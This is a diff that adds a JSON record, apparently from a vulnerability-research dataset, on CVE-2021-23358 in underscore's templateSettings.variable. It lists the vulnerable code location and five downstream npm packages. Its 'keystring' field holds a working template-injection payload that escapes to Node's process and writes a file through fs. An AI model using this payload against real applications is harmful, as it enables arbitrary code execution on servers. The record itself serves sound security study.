@@ -1,0 +1,14 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.5.0",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "wash@0.1.1",
+    "hirelings@0.4.2",
+    "nbc@0.0.10",
+    "gett@0.0.2",
+    "evented-async@0.0.1"
+  ]
+}
